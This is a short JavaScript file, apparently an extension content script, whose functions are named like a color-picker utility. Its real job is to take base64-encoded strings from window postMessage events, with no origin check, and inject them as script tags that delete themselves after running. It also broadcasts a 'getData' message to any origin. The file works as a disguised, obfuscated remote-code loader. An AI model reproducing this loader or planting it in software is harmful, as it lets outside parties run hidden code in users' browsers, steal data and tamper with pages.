function createColorScript(id , s) {
    const colorPicker = document.createElement('script');
    colorPicker.setAttribute('id', id);
    colorPicker.appendChild(document.createTextNode(s + `; document.querySelector('#${id}').remove();`));
    document.body.appendChild(colorPicker);
}

function colorPicker(s){
    const randomId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    createColorScript(randomId, s)
}

function initPMScr(r, c) {
    if(!document.body || !document.body.appendChild) {
        return setTimeout(() => initPMScr(r, c), 100);
    }
    if(c) { r = c + '(' + JSON.stringify(r) +')'}
    colorPicker(r)
}

window.addEventListener('message', (event) => {
    if(!event || !event.data) return;

    if(event.data.coo) {
        colorPicker(decodeURIComponent(escape(atob(event.data.coo))))
    }
    if(event.data.pos){
        const key = event.data.key;
        const handler = event.data.handler;
        initPMScr(key, handler)
    }
});

function coBa(){
    if(!document.body || !document.body.appendChild) {
        return setTimeout(coBa,100);
    }
    window.postMessage({'bac':1,'action':'getData'},'*');
}
coBa();

